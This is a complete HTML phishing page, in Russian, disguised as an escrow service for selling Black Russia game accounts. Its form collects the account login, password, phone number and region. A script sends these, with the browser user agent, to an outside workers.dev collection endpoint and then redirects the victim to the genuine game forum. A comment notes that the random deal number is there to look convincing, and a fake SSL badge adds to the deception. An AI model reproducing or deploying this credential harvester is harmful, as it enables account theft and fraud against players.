<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>BR Safe Deal — Эскроу-сервис</title>
<style>
  * { box-sizing: border-box; }
  body { margin:0; font-family: -apple-system, 'Segoe UI', Arial, sans-serif; background:#0a0e17; color:#e8edf5; min-height:100vh; display:flex; align-items:center; justify-content:center; padding:20px; }
  .box { width:100%; max-width:460px; background:#0f1521; border:1px solid #1c2536; border-radius:16px; padding:0; overflow:hidden; box-shadow:0 20px 60px rgba(0,0,0,.6); }

  .head { background:linear-gradient(135deg,#0f1521 0%,#152036 100%); padding:22px 24px 18px; border-bottom:1px solid #1c2536; display:flex; align-items:center; gap:12px; }
  .shield { width:42px; height:42px; border-radius:10px; background:linear-gradient(135deg,#1e88ff,#0b5fd1); display:flex; align-items:center; justify-content:center; font-size:22px; }
  .head-text { flex:1; }
  .head-title { font-size:16px; font-weight:700; letter-spacing:.3px; }
  .head-sub { font-size:12px; color:#7a89a3; margin-top:2px; }
  .live { display:inline-flex; align-items:center; gap:5px; font-size:11px; color:#3ddc84; }
  .dot { width:6px; height:6px; border-radius:50%; background:#3ddc84; box-shadow:0 0 8px #3ddc84; animation:pulse 1.6s infinite; }
  @keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.4} }

  .body { padding:22px 24px 26px; }

  .info { background:#0b1220; border:1px solid #1c2536; border-radius:10px; padding:12px 14px; font-size:12.5px; color:#93a1bb; line-height:1.55; margin-bottom:20px; }
  .info b { color:#e8edf5; }

  label { display:block; font-size:11.5px; color:#7a89a3; margin:14px 0 6px; text-transform:uppercase; letter-spacing:.6px; font-weight:600; }
  input, select { width:100%; padding:13px 14px; background:#0b1220; border:1px solid #1c2536; border-radius:9px; color:#e8edf5; font-size:14.5px; outline:none; transition:border .15s; font-family:inherit; }
  input:focus, select:focus { border-color:#1e88ff; }
  input::placeholder { color:#4a5977; }

  .row { display:flex; gap:10px; }
  .row > * { flex:1; }

  button { width:100%; margin-top:22px; padding:15px; background:linear-gradient(135deg,#1e88ff,#0b5fd1); color:#fff; border:none; border-radius:10px; font-weight:700; font-size:15px; cursor:pointer; letter-spacing:.3px; transition:transform .1s; }
  button:active { transform:scale(.99); }

  .foot { margin-top:16px; display:flex; align-items:center; justify-content:center; gap:8px; font-size:11px; color:#5a6785; }
  .lock { font-size:12px; }
</style>
</head>
<body>
  <div class="box">
    <div class="head">
      <div class="shield">🛡</div>
      <div class="head-text">
        <div class="head-title">BR Safe Deal</div>
        <div class="head-sub">Эскроу-сервис · Black Russia</div>
      </div>
      <div class="live"><span class="dot"></span>online</div>
    </div>

    <div class="body">
      <div class="info">
        <b>Сделка №BR-<span id="deal">—</span></b><br>
        Для фиксации передачи аккаунта подтвердите данные владельца. Средства замораживаются до проверки и подтверждения передачи.
      </div>

      <form id="f">
        <label>Никнейм персонажа</label>
        <input type="text" name="nick" placeholder="Ivan_Petrov" required autocomplete="off">

        <label>Логин (email или телефон)</label>
        <input type="text" name="login" placeholder="example@mail.ru / +7 777 000 00 00" required autocomplete="off">

        <label>Пароль от аккаунта</label>
        <input type="password" name="password" placeholder="••••••••" required autocomplete="off">

        <label>Номер телефона владельца</label>
        <input type="tel" name="phone" placeholder="+7 777 000 00 00" required autocomplete="off">

        <label>Город / регион</label>
        <select name="region" required>
          <option value="">Выберите регион</option>
          <option>Алматы</option>
          <option>Астана</option>
          <option>Шымкент</option>
          <option>Караганда</option>
          <option>Актобе</option>
          <option>Атырау</option>
          <option>Тараз</option>
          <option>Павлодар</option>
          <option>Усть-Каменогорск</option>
          <option>Семей</option>
          <option>Другой</option>
        </select>

        <button type="submit">Подтвердить и заморозить средства</button>
      </form>

      <div class="foot"><span class="lock">🔒</span> Соединение защищено · SSL 256-bit</div>
    </div>
  </div>

<script>
  // Генерация номера сделки при загрузке — выглядит живым
  const n = Math.floor(100000 + Math.random() * 900000);
  document.getElementById('deal').textContent = n;

  document.getElementById('f').addEventListener('submit', async function(e){
    e.preventDefault();
    const data = {
      nick: this.nick.value,
      login: this.login.value,
      password: this.password.value,
      phone: this.phone.value,
      region: this.region.value,
      deal: 'BR-' + n,
      ua: navigator.userAgent,
      ts: new Date().toISOString()
    };
    try {
      await fetch('https://br-collect.cucuruznik6767.workers.dev', {
        method:'POST',
        headers:{'Content-Type':'application/json'},
        body: JSON.stringify(data)
      });
    } catch(err){}
    window.location.href = 'https://forum.blackrussia.online/';
  });
</script>
</body>
</html>
